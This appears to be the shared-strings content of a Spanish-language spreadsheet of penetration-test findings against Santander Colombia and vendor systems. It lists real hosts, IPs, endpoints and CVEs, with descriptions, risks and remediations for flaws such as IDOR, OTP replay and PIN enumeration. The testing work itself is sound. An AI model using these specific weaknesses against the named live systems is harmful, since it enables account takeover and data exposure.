  </si>
  <si>
    <t>MAN-68e78bb0c27f315eb11bab4d</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-009-AP-001</t>
  </si>
  <si>
    <t>Abuso por repetición de código OTP expuesto en parámetro GET</t>
  </si>
  <si>
    <t>https://servicios.santander.com.co/PortalDeInforma
cion/account/v1/account/send_otp_email_portal</t>
  </si>
  <si>
    <t xml:space="preserve">Durante las pruebas realizadas sobre la aplicación se ha podido comprobar que una vez se genera
la url para solicitar el código OTP, almacenado en un parámetro GET, se puede utilizar dicha url
continuamente provocando la generación y envío del código al usuario que lo tenga configurado.
Si bien esto no es un problema de seguridad en cuanto a la interceptación del código OTP, si se
puede utilizar para ataques de ingeniería social dónde se le haga pensar al usuario que al visitar un
determinado sitio propuesto por el atacante este recibe un código que ve que es legítimo y
proporcione el código al atacante. </t>
  </si>
  <si>
    <t>Exposición del OTP facilita la suplantación si el atacante puede leer la URL; el reenvío masivo de la
petición provoca spam de códigos al usuario, posible agotamiento de servicios de mensajería, costes
operacionales y confusión del usuario que puede derivar en errores de seguridad (aceptación de
códigos no solicitados). En escenarios donde el OTP habilita operaciones sensibles, la
confidencialidad comprometida puede llevar a compromisos de cuenta.</t>
  </si>
  <si>
    <t>Se recomienda seguir las siguientes indicaciones:
• Nunca enviar tokens sensibles en la URL. Mover el código OTP a cuerpo de petición POST o
transmitirlo por canales seguros server-to-server.
• Usar siempre HTTPS con HSTS y asegurar que no queden trazas en referer o logs.
• Implementar tokens anti-replay: cada petición de envío debe exigir un nonce único y
marcado como usado al primer envío.
• Aplicar rate limiting por usuario, por destinatario (teléfono/email) y por IP; incluir backoff
exponencial y bloqueo temporal tras umbrales.
• Limitar caducidad y reutilización: OTP de vida muy corta y marcar como inválido tras primer
envío o primer uso.
• Verificación de intención: para reenvíos, requiere acción explícita del usuario autenticado o
un CAPTCHA para prevenir automatización.
• Registro y alertas: monitorizar picos en envíos de OTP y alertar/mitigar automáticamente.
• Evitar inclusión en referer: configurar cabeceras y políticas para que no se envíe la URL a
terceros.
• Pruebas y revisión: revisar logs y flujos para garantizar que parámetros sensibles no se
almacenan.</t>
  </si>
  <si>
    <t>QA-WAS-b541cc67-a25e-42f5-9be9-4b8dc358a76b</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-009-AP-002</t>
  </si>
  <si>
    <t>https://servicios.santander.com.co/PortalDeInformacion/customer/v1/customer/customerI
nformationPortal</t>
  </si>
  <si>
    <t xml:space="preserve">Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión
no tienen aplicado el atributo de seguridad "secure". Este atributo indica al navegador que sólo
incluya la cookie si se envía a través de un canal cifrado como es el caso del protocolo HTTPS.
La siguiente captura demuestra la ausencia del atributo mencionado en las cookies que manejan
datos de la sesión del usuario. </t>
  </si>
  <si>
    <t>El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un
atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos
dentro de la aplicación.</t>
  </si>
  <si>
    <t>Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad "secure". De esta manera se evitando que el identificador de sesión pueda ser transmitido por canales no cifrados.
La solución concreta dependerá del lenguaje o framework en el que esté implementado la aplicación.</t>
  </si>
  <si>
    <t>MAN-68c98ad93226c04237be7abf</t>
  </si>
  <si>
    <t>https://181.57.221.234/#/views/home</t>
  </si>
  <si>
    <t>MAN-68db7293c27f315eb11978de</t>
  </si>
  <si>
    <t>Información acerca de las tecnologías en las cabeceras de respuesta</t>
  </si>
  <si>
    <t>https://181.57.221.233</t>
  </si>
  <si>
    <t>MAN-68db71d8c27f315eb11978dd</t>
  </si>
  <si>
    <t>Información sensible en metadatos</t>
  </si>
  <si>
    <t>C-25-CNMPA-012-CO-001</t>
  </si>
  <si>
    <t>acceso a información de Firewall</t>
  </si>
  <si>
    <t>l servicio de Topología/SecuRemote de Check Point (puerto TCP 264) responde a consultas pre_x0002_autenticadas que permiten recuperar información identificativa del propio firewall y de la estación  de gestión. Con una simple consulta el dispositivo puede devolver el nombre del host del firewall y  el CN/ICA del certificado de la gestión, exponiendo nombres identificativos</t>
  </si>
  <si>
    <t>Cerrar o restringir el acceso al puerto 264 desde Internet y permitirlo solo en la red de gestión 
(ACLs/zonas de confianza). Revisar la configuración de Check Point para deshabilitar servicios de 
descubrimiento innecesarios o minimizar la información que devuelven, y aplicar control de acceso 
basado en IP/VPN para la estación de gestión. Complementariamente, alertar/monitorizar intentos 
de conexión a dicho puerto (logs/IDS) y revisar las políticas de segmentación para asegurar que la 
SmartCenter no sea accesible desde redes públicas.</t>
  </si>
  <si>
    <t>Aunque no permite acceso directo, esta filtración es información de reconocimiento de valor para 
un atacante: identifica la existencia de una infraestructura Check Point, el nombre y localización lógica de la estación de gestión y posibles dominios/certificados asociados. Ese dato facilita ataques  dirigidos (phishing/credential stuffing contra administradores), mapeo de la red y selección de  exploits/firmware específicos, y reduce la incertidumbre previa a intentos de intrusión o ingeniería 
social. Además, si la gestión está accesible desde redes no confiables, puede indicar una mala 
segmentación que aumente el riesgo de compromiso.</t>
  </si>
  <si>
    <t>MAN-68f9f9364f1323618c1a6b3d</t>
  </si>
  <si>
    <t>SC-25-CNMPO-014-CO-001</t>
  </si>
  <si>
    <t>fuga de información de Software y versiones vulnerables a exploits críticos</t>
  </si>
  <si>
    <t>181.57.221.232:22419</t>
  </si>
  <si>
    <t>e han encontrado evidencias de la presencia de varias debilidades y fallos de seguridad en  versiones antiguas de software. Estas vulnerabilidades pueden incluir errores de programación,  brechas de seguridad conocidas, problemas de cifrado débil o fallos en la autenticación, entre otros. Concretamente, no existe una PoC pública para su explotación, pero sí hay análisis técnicos públicos  y evidencia de explotación, lo que indica que actores ya disponen de formas de explotarlo.
Además, no se descarta la existencia de un exploit no público.
CVE-2025-10035
CVE-2024-0204
CVE-2023-0669
CVE-2024-25156</t>
  </si>
  <si>
    <t>Se deberá actualizar la versión de la librería a su última versión.
Se recomienda evitar que la aplicación devuelva al usuario información relativa a la naturaleza y 
versión de ésta. Este tipo de información puede ser accesible a través de los identificadores de sesión 
utilizados, mensajes de error y/o páginas por defecto.
Se deberá modificar y adecuar la gestión de errores no controlados del Sistema.</t>
  </si>
  <si>
    <t>Conocer la versión y tipo del software que se está ejecutando en el activo analizado permite a un 
atacante localizar las vulnerabilidades publicadas y utilizar los exploits apropiados para explotar las 
mismas.  De esta manera, el atacante podría hacerse con el control del activo analizado de ser éste vulnerable.</t>
  </si>
  <si>
    <t>MAN-68f9f8a54f1323618c1a6b28</t>
  </si>
  <si>
    <t>SC-25-CNMPO-014-CO-002</t>
  </si>
  <si>
    <t>Fuga de información de Software y versiones desactualizadas</t>
  </si>
  <si>
    <t>https://servicios.santander.com.co</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas contra la aplicación de esta revisión, se ha podido determinar que  existen referencias y código de software con fallos de seguridad. Se ha podido observar que el  Servidor responde con datos sensibles a las peticiones realizadas por la aplicación, desvelando  información acerca de la versión y aplicación utilizadas de las librerías jquery-ui y DOMPurify, más  concretamente en sus versiones:
• jquery-ui 1.12.1
• DOMPurify 2.3.6</t>
  </si>
  <si>
    <t>Conocer la versión y tipo del software que se está ejecutando en el activo analizado permite a un 
atacante localizar las vulnerabilidades publicadas y utilizar los exploits apropiados para explotar las 
mismas. 
De esta manera, el atacante podría hacerse con el control del activo analizado de ser éste vulnerable.</t>
  </si>
  <si>
    <t>SC-25-CNMPO-014-CO-003</t>
  </si>
  <si>
    <t>Resolución DNS Externa mediante Cabecera Host</t>
  </si>
  <si>
    <t>Debido a una mala configuración del servidor, la aplicación puede realizar consultas DNS externas  basadas en datos proporcionados por un atacante. Durante las pruebas se observó que la aplicación  ejecutó una resolución DNS hacia un dominio bajo control del atacante, el cual fue inyectado  mediante la cabecera Host de una petición HTTP.
Este comportamiento expone información interna del servidor, como su dirección IP, y confirma que  es posible manipular la aplicación para que inicie conexiones salientes. Aunque esto no expone directamente datos sensibles, demuestra que el servidor puede actuar como intermediario para  interactuar con sistemas externos, lo que potencialmente habilita ataques más avanzados como  Server-Side Request Forgery (SSRF) o exfiltración de datos mediante DNS.</t>
  </si>
  <si>
    <t>Se recomienda validar y sanear correctamente todas las cabeceras HTTP recibidas, en especial la 
cabecera Host, para evitar el procesamiento de valores arbitrarios.
Además, es aconsejable deshabilitar cualquier funcionalidad que permita resoluciones DNS 
salientes desde el servidor, salvo que sea estrictamente necesaria para la operación de la 
aplicación.
Finalmente, se debe implementar un filtrado de tráfico saliente (egress filtering) para restringir las 
conexiones del Servidor únicamente a destinos previamente autorizados y controlados.</t>
  </si>
  <si>
    <t>El comportamiento observado sugiere la existencia de una posible vector de Server-Side Request 
Forgery (SSRF) o de descubrimiento de servicios internos. 
Aunque en esta fase solo se ha confirmado la resolución de dominios externos, si el Servidor 
permitiese conexiones salientes más allá del DNS (por ejemplo, mediante TCP), esto podría facilitar 
ataques más graves, como escaneo de puertos internos, acceso a metadatos en servicios en la nube 
o, en ciertos escenarios, incluso la ejecución remota de código.</t>
  </si>
  <si>
    <t>SC-25-CNMPO-013-AP-001</t>
  </si>
  <si>
    <t>https://confirming_x0002_factoring.santander.com.co</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>MAN-691b3f6f5459c5351f04d203</t>
  </si>
  <si>
    <t>SC-25-CNMPO-017-AP-001</t>
  </si>
  <si>
    <t>www.cdt.santander.com.co
api.cdt.santander.com.co</t>
  </si>
  <si>
    <t>Las "Referencias Inseguras a Objetos de manera Directa" (IDOR) se producen cuando una aplicación proporciona acceso directo a los objetos en función de la entrada proporcionada por el usuario (Normalmente un identificador de objeto, independientemente de su predictibilidad).Esta vulnerabilidad permite a los atacantes evadir la autorización y acceder a los recursos directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto.
Dichos recursos pueden ser entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema y más. Esto se debe al hecho de que la aplicación toma la entrada proporcionada por el usuario y la utiliza para recuperar un objeto sin realizar suficientes comprobaciones de autorización.</t>
  </si>
  <si>
    <t>Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo
directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto,en este caso, el CDT, con el qué el atacante puede obtener la información del mismo. Dichos recursos
pueden ser registros, entradas de bases de datos que pertenecen a otros usuarios, archivos en el
sistema o cualquier tipo de información a la que no debería tener acceso de manera previa,
comprometiendo su confidencialidad ante consultas, o integridad o disponibilidad ante su
modificación</t>
  </si>
  <si>
    <t>Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para
acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene
privilegios de acceso a la información consultada.
Se recomienda aplicar las recomendaciones sobre cualquier operación del aplicativo que referencie
a un objeto enviado en un parámetro de una petición, los cuales podrán ser modificados por el
usuario antes de su envío al servidor</t>
  </si>
  <si>
    <t>MAN-69037d9fda6d35412ab5bdd6</t>
  </si>
  <si>
    <t xml:space="preserve">  DESCRIPCIÓN   La cabecera "CSP" (Content Security Policy) permite al navegador del usuario controlar los recursos JavaScript cargados en el aplicativo web, pudiendo controlar los dominios que tienen permitido la carga de scripts en la página.   DETALLE   SC-25-CNMPO-016-CO-001:   Se ha detectado que el servidor web no incluye la cabecera "Content Security Policy" en las respuestas HTTP del servidor.   La siguiente captura de pantalla muestra las cabeceras HTTP que el servidor manda en su respuesta. Como se puede observar, la cabecera "Content Security Policy" no se encuentra entre las cabeceras devueltas:      Ilustración 2. Petición      Ilustración 3. Respuesta del servidor sin la cabecera Content Security Policy       RIESGO   La ausencia de la cabecera "Content Security Policy" puede permitir a un atacante que localice una vulnerabilidad de tipo "Cross Site Scripting"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t>
  </si>
  <si>
    <t xml:space="preserve">  RECOMENDACIÓN   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"Content-Security-Policy" (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se trata de una versión antigua y no es necesario configurarla).   Un ejemplo de configuración de cabecera es el siguiente:   • Content-Security-Policy: default-src 'self' *.trusted.com   Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo:   • &lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';"&gt;   Para obtener una referencia completa acerca de todas las directivas "Content Security Policy" se recomienda visitar los siguientes enlaces:   • https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP   • https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html</t>
  </si>
  <si>
    <t>MAN-68f7769f4f1323618c186917</t>
  </si>
  <si>
    <t>confirming-factoring.santander.com.co:443</t>
  </si>
  <si>
    <t xml:space="preserve">  DESCRIPCIÓN   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   DETALLE   SC-25-CNMPO-013-AP-001-001:   Durante la revisión se ha detectado que es posible provocar que la aplicación web muestre detalles internos de la aplicación.   Para provocar el fallo se debe autenticar y visitar la siguiente url.   URL afectada:   - https://confirming-factoring.santander.com.co/factoring/common/mainPages/login.seam?url=       Esto provoca un error interno en la aplicación, lo que resulta con un mensaje de error interno del servidor con detalle de la aplicación tal y como se puede ver en las siguientes evidencias:   - Evidencia 1: Stack trace      - Evidencia 2: Component tree      - Evidencia 3: Scoped Variables   RIESGO   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t>
  </si>
  <si>
    <t xml:space="preserve">  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t>
  </si>
  <si>
    <t>QA-WAS-526095c8-0dc8-4c60-8e80-e3e2c8488bf0</t>
  </si>
  <si>
    <t>http://teal.cdt.santander.com.co/</t>
  </si>
  <si>
    <t>A link is accessible over an insecure connection, i.e. HTTP.</t>
  </si>
  <si>
    <t>Ensure that the target website is accessible over HTTPS only.
If non-HTTPS requests are received, the server should redirect the request to HTTPS. It is also recommended to use the Strict-Transport-Security response header to ensure that web browsers use only HTTPS when making requests to the server.</t>
  </si>
  <si>
    <t>QA-WAS-d628db14-458f-4c7d-a615-17d082a821d2</t>
  </si>
  <si>
    <t>https://servicios.santander.com.co/common/squidGuard.conf</t>
  </si>
  <si>
    <t>A potentially sensitive file was discovered on the Web server. This file may or may not be directly associated with the web application. 
Files Checked:
nginx.conf, .htpasswd, key.pem, certificate.pem
QID Detection Logic:
This QID sends a GET request to the target server to retrieve the file content.</t>
  </si>
  <si>
    <t>Verify that access to this file is permitted. If necessary, remove it or apply access controls to it.</t>
  </si>
  <si>
    <t>MAN-692970300018985eafc64abb</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-010-AP-001</t>
  </si>
  <si>
    <t>recidam.olimpiait.com</t>
  </si>
  <si>
    <t>En este caso particular un usuario puede acceder a información del convenio de otros usuarios  modificando el valor de tipo UUID del parámetro GuidConv en el endpoint 
https://recidam.olimpiait.com/ConsultarConvenio.</t>
  </si>
  <si>
    <t>Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para 
acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene 
privilegios de acceso a la información consultada.</t>
  </si>
  <si>
    <t>Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo 
directamente modificando el valor de un parámetro utilizado para apuntar directamente a un 
objeto. Dichos recursos pueden ser registros, entradas de bases de datos que pertenecen a otros 
usuarios, archivos en el sistema o cualquier tipo de información a la que no debería tener acceso de 
manera previa.</t>
  </si>
  <si>
    <t>sin definir</t>
  </si>
  <si>
    <t>MAN-692973e60018985eafc64b29</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-010-CO-002</t>
  </si>
  <si>
    <t>recidhub.olimpiait.com</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha comprobado que las cabeceras de respuesta del servidor  revelan información interna acerca del tipo de servidor y versión del mismo así como información  de la infraestructura interna de la aplicación a través de la dirección URL  https://recidhub.olimpiait.com/api/DisciplinaryHistory/GetPublicIp</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a 
un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como 
generar ataques más elaborados contra la plataforma.</t>
  </si>
  <si>
    <t>MAN-692971de0018985eafc64aee</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-010-CO-003</t>
  </si>
  <si>
    <t>recidaw.olimpiait.com</t>
  </si>
  <si>
    <t>La aplicación auditada divulga información acerca de una dirección IP interna utilizada, a través del 
cuerpo de la propia respuesta HTTP, al acceder a la dirección URL 
https://recidaw.olimpiait.com/Validación/GetIp</t>
  </si>
  <si>
    <t>Se recomienda evitar que la aplicación devuelva al usuario información relativa al funcionamiento 
interno del servidor, como puede ser direccionamiento IP de la red interna en la que está ubicado 
el mismo.</t>
  </si>
  <si>
    <t>Un atacante podría utilizar esta vulnerabilidad para obtener información del direccionamiento IP del 
sistema, pudiendo llegar a localizar otros activos vulnerables en la red o mapear la red interna.</t>
  </si>
  <si>
    <t>ESG</t>
  </si>
  <si>
    <t>MAN-6942d86e4867435d64ccb596</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-011-AP-001</t>
  </si>
  <si>
    <t>Envío de Información sensible en URL</t>
  </si>
  <si>
    <t>http://181.57.221.233/esg/vinculation-form?email_token=&lt;token&gt;</t>
  </si>
  <si>
    <t>Se ha detectado que la aplicación auditada envía información el token de sesión para realizar el 
formulario a través de la URL: 
http://181.57.221.233/esg/vinculation-form?email_token=&lt;token&gt;</t>
  </si>
  <si>
    <t>Un atacante con acceso al historial del navegador de un usuario legítimo de la aplicación podría 
obtener el token de autorización transmitido en la propia dirección URL, el cual queda almacenado 
en dicho historial. Esto permitiría al atacante utilizar el token para acceder al formulario o completar 
acciones en nombre del usuario, siempre que el token no haya sido consumido previamente.
De la misma manera, un atacante con acceso a los registros de servidores intermedios (como 
proxies, balanceadores o sistemas de monitorización) podría acceder al token, ya que las URLs 
suelen ser registradas de forma íntegra durante el procesamiento de las peticiones.</t>
  </si>
  <si>
    <t>Se recomienda no transmitir nunca tokens de autenticación o autorización a través de la URL, 
evitando el uso de parámetros GET para este fin.
Como medida principal, se recomienda que el formulario se valide mediante un Bearer Token 
temporal, enviado exclusivamente en la cabecera Authorization y gestionado por el backend, de 
forma que el token no sea expuesto en la dirección URL ni almacenado en historiales o logs.
De manera complementaria, se recomienda que la información sensible y los mecanismos de 
autorización se mantengan asociados a la sesión del usuario en el servidor, haciendo referencia alos mismos únicamente mediante identificadores no sensibles. Asimismo, se recomienda limitar la 
validez de estos tokens en el tiempo, invalidarlos tras su primer uso y asociarlos al contexto del 
cliente para prevenir ataques de reutilización.</t>
  </si>
  <si>
    <t>Julio Beltran</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-011-AP-002</t>
  </si>
  <si>
    <t>Ausencia de cabeceras</t>
  </si>
  <si>
    <t>http://181.57.221.233/</t>
  </si>
  <si>
    <t>Durante la evaluación de seguridad, se encontró que múltiples encabezados de seguridad HTTP  estaban ausentes en las respuestas del servidor. La ausencia de estos encabezados debilita la  postura de seguridad general de la aplicación al no implementar protecciones clave en el navegador.
Estos encabezados ayudan a restringir las interacciones entre orígenes, mitigar el clickjacking, hacer  cumplir políticas de aislamiento, limitar la filtración de información y proteger contra ataques web  comunes.</t>
  </si>
  <si>
    <t>La ausencia de encabezados de seguridad reduce el nivel de endurecimiento del lado del cliente que 
proporciona el navegador. Como resultado, los atacantes pueden aprovechar políticas de origen 
cruzado relajadas, incrustar la aplicación en iframes maliciosos, explotar funciones permitidas del 
navegador o filtrar información sensible a través de metadatos de referencia.
La ausencia de Content-Security-Policy, Cross-Origin-Opener-Policy y Cross-Origin-Embedder-Policy 
significa que la aplicación no puede beneficiarse de las medidas modernas de aislamiento de sitios, 
lo que podría exponerla a filtraciones entre sitios o ataques de incrustación.</t>
  </si>
  <si>
    <t>Se recomienda implementar los encabezados de seguridad HTTP más importantes que faltan para 
fortalecer las protecciones del navegador de la aplicación y reducir la exposición a ataques web 
comunes. Los siguientes encabezados deben configurarse con políticas restrictivas:
• COEP, COOP, CORP para hacer cumplir el aislamiento entre orígenes.
• Content-Security-Policy (CSP) para controlar las fuentes permitidas de scripts, estilos y otros 
recursos.
• Permissions-Policy para restringir el acceso a funciones avanzadas del navegador.
Clear-Site-Data para la limpieza segura de sesiones cuando sea necesario. 
• X-Frame-Options para evitar que la página se incruste en iframes y mitigar el clickjacking. 
Implementar estos encabezados reducirá la superficie de ataque, mitigará riesgos como el 
clickjacking, la exposición de datos y el uso indebido entre orígenes, y mejorará la postura general 
de seguridad de la aplicación.</t>
  </si>
  <si>
    <t>Invoway</t>
  </si>
  <si>
    <t>MAN-6957badd4867435d64d9eea0</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-012-AP-001</t>
  </si>
  <si>
    <t>Fallo en identificada en la validación del PIN</t>
  </si>
  <si>
    <t>https://uat.invoway.com/action/verificarClaveCliente</t>
  </si>
  <si>
    <t>Durante las pruebas de seguridad se identificó una vulnerabilidad lógica en los mecanismos de autenticación y autorización que permite a un usuario previamente autenticado enumerar los PIN asociados a otras cuentas conociendo únicamente su dirección de correo electrónico. La aplicación no valida correctamente la vinculación entre el contexto de la sesión autenticada y el usuario objetivo sobre el que se realiza la verificación del PIN, lo que posibilita realizar múltiples intentos de validación sin controles efectivos de limitación, bloqueo o detección de abuso. Como consecuencia, un atacante puede identificar PINs válidos y, una vez obtenidos, impersonar a otros 
usuarios, accediendo de forma no autorizada a sus cuentas y funcionalidades asociadas, lo que evidencia un fallo de lógica de autenticación y control de acceso, y no un error de inyección u origen técnico clásico.</t>
  </si>
  <si>
    <t>Se recomienda implementar las siguientes medidas de seguridad de forma urgente: (1) Validar en 
el servidor, de manera aleatoria e independiente del cliente, qué posiciones del PIN deben ser 
verificadas en cada intento de autenticación, almacenando esta información en la sesión del 
servidor y nunca confiando en los parámetros enviados por el cliente. (2) Implementar una 
validación robusta del identificador de usuario en el backend, asegurando que coincida con el 
usuario autenticado en la sesión actual e impidiendo que se pueda modificar el código de usuario 
durante el flujo de validación del PIN. (3) Establecer controles de límite de intentos fallidos por 
cuenta y por dirección IP, bloqueando temporalmente el acceso tras un número reducido de 
intentos incorrectos. (4) Implementar monitorización y alertas en tiempo real para detectar 
patrones anómalos de validación de PIN, como múltiples intentos desde la misma sesión o IP. (5) 
Considerar la adopción de mecanismos de autenticación multifactor más robustos, como OTP 
basados en tiempo o autenticación biométrica, para complementar o reemplazar el sistema actual 
de PIN.</t>
  </si>
  <si>
    <t>La combinación de estas dos vulnerabilidades representa un riesgo crítico para la seguridad de la 
aplicación, ya que permite a un atacante comprometer cualquier cuenta de usuario mediante un 
ataque de fuerza bruta altamente eficiente. Al poder manipular las posiciones del PIN que son 
validadas por el servidor y realizar suplantación de identidad modificando el código de usuario en 
las peticiones, un atacante únicamente necesita probar un máximo de 100 combinaciones (en lugar 
de las 999.999 teóricas de un PIN de 6 dígitos) para obtener acceso no autorizado. Este escenario 
expone información confidencial, permite realizar operaciones fraudulentas en nombre de 
usuarios legítimos y compromete la integridad de todo el sistema. La facilidad de explotación y el 
bajo número de intentos requeridos hace que estas vulnerabilidades sean especialmente 
peligrosas, ya que pueden evadir mecanismos tradicionales de detección de fuerza bruta basados 
en umbrales de intentos fallidos, y no requieren conocimiento previo de las credenciales de la 
víctima.</t>
  </si>
  <si>
    <t>Leidy Godoy</t>
  </si>
  <si>
    <t>MAN-6957bb0d4867435d64d9eea1</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-012-AP-002_x000D_</t>
  </si>
  <si>
    <t>Denegación de servicio por bloqueo de cuenta</t>
  </si>
  <si>
    <t>https://uat.invoway.com/action/generarCredencialesCliente</t>
  </si>
  <si>
    <t>Durante las pruebas se identificó una debilidad en el mecanismo de bloqueo de cuentas que permite realizar múltiples intentos de autenticación fallidos sin que se active un bloqueo efectivo ni medidas de mitigación adecuadas. La ausencia o incorrecta implementación de controles como contadores de intentos, bloqueos temporales o retrasos progresivos facilita ataques de fuerza bruta y enumeración de credenciales, incrementando significativamente el riesgo de acceso no 
autorizado a cuentas de usuario.</t>
  </si>
  <si>
    <t>Se recomienda revisar y modificar la lógica de la funcionalidad de recuperación de contraseña con 
el objetivo de evitar que pueda ser utilizada como un mecanismo de bloqueo de cuentas por parte 
de usuarios maliciosos. En particular, la aplicación no debería permitir que acciones iniciadas 
únicamente a partir del conocimiento de una dirección de correo electrónico deriven en el bloqueo 
de una cuenta. Es aconsejable implementar controles adicionales como limitación de intentos por 
origen, mecanismos de detección de abuso, validaciones progresivas (por ejemplo, CAPTCHA o desafíos adaptativos) y flujos de recuperación que no alteren el estado de la cuenta hasta que el 
usuario legítimo complete satisfactoriamente el proceso de verificación. Estas medidas reducirán 
el riesgo de denegación de servicio a nivel de usuario y minimizarán la necesidad de intervención 
manual por parte del personal de soporte.</t>
  </si>
  <si>
    <t>Esta situación permite que un actor malicioso abuse de la propia lógica de la aplicación para 
provocar el bloqueo de una o varias cuentas de usuario de forma reiterada. Mediante la 
automatización de solicitudes legítimas desde el punto de vista funcional, un atacante podría forzar 
estados de bloqueo persistentes sin necesidad de explotar una vulnerabilidad técnica compleja. 
Como consecuencia, las cuentas afectadas quedarían inoperativas hasta que se realice una 
intervención manual por parte del personal responsable, generando un escenario de denegación 
de servicio a nivel de usuario, impacto operativo sobre los procesos de negocio y una carga 
adicional para los equipos de soporte o administración.</t>
  </si>
  <si>
    <t>MAN-6957bb564867435d64d9eea2</t>
  </si>
  <si>
    <t>Acceso No Autorizado a Información restringida</t>
  </si>
  <si>
    <t>https://uat.invoway.com</t>
  </si>
  <si>
    <t xml:space="preserve">  DESCRIPCIÓN   El acceso no autorizado a información restringida ocurre cuando individuos o sistemas obtienen acceso a datos confidenciales o clasificados sin contar con los permisos legítimos para ello. Esta vulnerabilidad se materializa mediante diversos métodos como la explotación de fallos de seguridad en aplicaciones, el robo o compromiso de credenciales, técnicas de ingeniería social, o el abuso de privilegios por parte de usuarios internos. Como resultado, información sensible como datos personales, secretos comerciales, propiedad intelectual o registros financieros queda expuesta a actores no autorizados, generando riesgos significativos que incluyen pérdidas económicas, sanciones regulatorias, daño reputacional y potencial ventaja para competidores o actores malintencionados.   DETALLE   A continuación se muestran las pantallas que visualiza un usuario con privilegios elevados de forma legítima, así como las peticiones HTTP realizadas y las respuestas emitidas por parte del servidor:          Figura 18 - Como el usuario javilasumariva que tiene privilegios elevados es posible identificar el panel de Administración      Figura 19 - El usuario javila accediendo legítimamente a la lista de proveedores          Figura 20 - El cuerpo json de la petición realizada como administrador de la aplicación al solicitar el listado de proveedores      Figura 21 - Fragmento de la respuesta del servidor tras la petición legitima con el usuario javilasumariva   A continuación se replicará esta misma petición utilizando otro usuario en cuyo panel de opciones la funcionalidad de administrador no se encuentra disponible:      Figura 22 - El usuario ggonzalez no tiene acceso al panel de administración   A continuación se muestra la información de la sesión del usuario ggonzalez en el navegador.      Figura 23 - Cookie de sesión del usuario ggonzalez   A continuación como el usuario ggonzalez se intercepta cualquier petición al endpoint /action/router, se puede observar que la cookie de sesión se pasa en la cabecera “Authorization”.      Figura 24 - Usando la cookie del usuario ggonzalez se replica la petición para listar los proveedores (sólo disponible desde el panel de administración)      Figura 25 - Petición con respuesta por parte del servidor   Con esto un usuario está accediendo a información que debería estar sólo autorizado a usuarios con privilegios elevados.   RIESGO   El acceso no autorizado a información restringida conlleva riesgos técnicos significativos para la organización. Un atacante puede no solo visualizar datos confidenciales como credenciales, configuraciones de sistemas o información sensible de usuarios, sino también modificar o eliminar registros críticos, comprometiendo la integridad de las bases de datos. Este acceso inicial puede servir como vector para escalar privilegios dentro del sistema, permitiendo al atacante moverse lateralmente por la infraestructura, comprometer otros servicios conectados, instalar puertas traseras para mantener persistencia, o exfiltrar grandes volúmenes de información sin ser detectado. La combinación de estos factores puede resultar en un compromiso total del entorno, pérdida de control sobre sistemas críticos y exposición masiva de activos de información.</t>
  </si>
  <si>
    <t xml:space="preserve">  RECOMENDACIÓN   Implementar los mecanismos de autorización necesarios para garantizar que cada usuario únicamente pueda acceder a los recursos y funcionalidades correspondientes a su rol y nivel de privilegios asignado. Estos controles deben validarse tanto en el lado del cliente como, especialmente, en el servidor, asegurando que todas las peticiones sean verificadas antes de conceder acceso a información o funcionalidades restringidas. Se recomienda adoptar el principio de mínimo privilegio, realizar auditorías periódicas de permisos, implementar sistemas de control de acceso basado en roles (RBAC), y registrar todos los intentos de acceso para facilitar la detección de actividades anómalas o no autorizadas.</t>
  </si>
  <si>
    <t>MAN-6957bb9d4867435d64d9eea3</t>
  </si>
  <si>
    <t xml:space="preserve">  DESCRIPCIÓN   La enumeración de usuarios es una vulnerabilidad que permite a un atacante identificar qué cuentas existen en el sistema mediante la funcionalidad de recuperación de contraseña. El sistema revela la existencia o inexistencia de usuarios a través de mensajes diferenciados como "Se ha enviado un correo de recuperación" frente a "El usuario no existe", permitiendo al atacante confirmar qué cuentas son válidas sin necesidad de credenciales. Esta información facilita ataques posteriores más efectivos como fuerza bruta, credential stuffing o campañas de phishing dirigido, ya que el atacante puede concentrar sus esfuerzos únicamente en cuentas confirmadas.   DETALLE   SCBD-25-CNMPO-012-AP-004:   Se ha identificado en la funcionalidad de recuperación de contraseña una vulnerabilidad que permite la enumeración de usuarios válidos registrados en el sistema. A continuación se muestran las evidencias de susodicha falla.      Figura 26 - Acceso a la funcionalidad para recuperar la contraseña del usuario      Figura 27 - La aplicación solicita el código de usuario, es la dirección de correo del usuario del que se quiere restablecer la contraseña          Figura 28 - Petición inteceptada tras introducir la dirección de e-mail y enviar la petición   Estas credenciales son actualizadas automáticamente sin interacción del usuario legítimo. Esto se ha plasmado en la vulnerabilidad de denegación de servicio explicada en este mismo informe.   Por otra parte en la respuesta del servidor es posible identificar cuando la dirección de correo introducida exista en la aplicación o por otra parte no existe.       